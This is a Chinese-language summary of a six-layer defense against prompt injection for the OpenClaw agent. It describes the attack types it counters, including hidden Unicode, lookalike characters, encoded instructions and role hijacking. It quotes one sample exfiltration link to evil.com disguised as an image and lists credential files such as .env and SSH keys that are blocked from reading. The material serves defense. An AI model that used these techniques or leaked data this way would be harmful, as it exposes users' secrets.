## 核心观点

Matthew Berman 为 OpenClaw 构建了一套 **6层提示注入防御系统**，包含 2,800 行防御代码和 132 个测试。这套系统的核心思想是：**分层防御 + 失败关闭 + 独立性原则**。

---

## 六层防御架构详解

### 第一层：确定性文本清理 (Layer 1)
**成本**: 免费 | **拦截率**:  majority

11步同步管道，在内容到达 LLM 前进行清理：

| 威胁类型 | 防御手段 |
|---------|---------|
| **隐形字符攻击** | 剥离不可见 Unicode 字符 |
| **钱包耗尽攻击** | 检测高 Token 消耗的 Unicode 字符 |
| **相似字符绕过** | 标准化 40+ 对相似字符 |
| **Token 预算超限** | 估算实际 Token 成本并截断 |
| **编码隐藏** | 解码 base64/hex 隐藏指令 |
| **角色劫持标记** | 正则匹配越狱命令 |

**关键洞察**: 字符数 ≠ Token 数。3,500 正常字符 ≈ 875 tokens，但 3,500 密集 Unicode 可能 = 35,000 tokens。

---

### 第二层：前沿扫描器 (Layer 2)
**成本**: 低 | **拦截率**: 语义攻击

专用 LLM 分类器，返回结构化风险评估：

```json
{
  "score": 0-100,
  "verdict": "allow|review|block",
  "categories": ["role_hijacking", "instruction_override", "social_engineering"],
  "reasoning": "...",
  "evidence": "..."
}
```

**阈值**: 35分审查 / 70分阻断  
**安全机制**: 分数优先于模型判断（模型说"允许"但75分 → 阻断）  
**失败策略**: 高风险源失败关闭，低风险源失败开放

**为什么用最强模型？** 最强模型 = 最难被劫持 + 最擅长检测劫持

---

### 第三层：出站内容门 (Layer 3)
**成本**: 免费

防止 LLM 输出泄露敏感信息：

- **密钥泄露**: API keys (Google/OpenAI/xAI/Slack/GitHub/Telegram)
- **内部路径**: 文件路径、内网地址
- **注入残留**: 角色前缀、覆盖指令
- **数据外泄**: 伪装成图片 URL 的泄露 (`![img](https://evil.com/steal?data=SECRET)`)
- **财务数据**: 内部定价/交易金额

---

### 第四层：脱敏管道 (Layer 4)
**成本**: 免费

发送前自动脱敏：

| 类型 | 处理方式 |
|-----|---------|
| API 密钥/Token | 替换为占位符 `[REDACTED]` |
| 个人邮箱 | 过滤 (保留企业邮箱) |
| 电话号码 | 脱敏 |
| 金额 | 脱敏 |

---

### 第五层：运行时治理 (Layer 5)
**成本**: 免费 | **最重要的一层**

**核心发现**: Bug 比攻击更烧钱

四层保护机制：

| 机制 | 作用 | 默认阈值 |
|-----|------|---------|
| **消费限制** | 滑动窗口追踪美元花费 | $5警告 / $15硬上限 (5分钟) |
| **调用量限制** | 原始调用量上限 | 200次/10分钟 |
| **生命周期限制** | 进程级调用计数器 | 300次/进程 |
| **重复检测** | 哈希缓存最近提示 | 返回缓存结果 |

**真实场景**: 损坏的游标、重试风暴、定时任务重叠 → 这些"周二Bug"比攻击更常见

---

### 第六层：访问控制 (Layer 6)
**成本**: 免费

- **路径守卫**: 禁止读取 `.env`, `credentials.json`, SSH keys 等
- **URL 安全**: 仅允许 http/https，检查内网地址，防御 DNS 重绑定

---

## 关键设计原则

### 1. 分层 = 独立性
> "No single layer is enough, and if any layer depends on another working correctly, the whole system is fragile."

每层必须独立工作，不依赖其他层。

### 2. 失败关闭 (Fail Closed)
对于邮件/webhook 等高风险源，扫描器失败时阻断内容。

### 3. 集中化
> "If each feature implements its own partial guardrails, the gaps are where attacks land."

四个共享阻塞点：
1. 清理 → LLM 前
2. 扫描器 → 单一入口
3. 治理 → 共享 LLM 客户端
4. 出站门 → 消息发送前

### 4. 80/20 版本
只想快速上手？只需这 4 层：
- L1: 文本清理
- L2: 扫描器 (单一入口)
- L5: 治理 (消费/量/重复限制)
- L3: 出站门
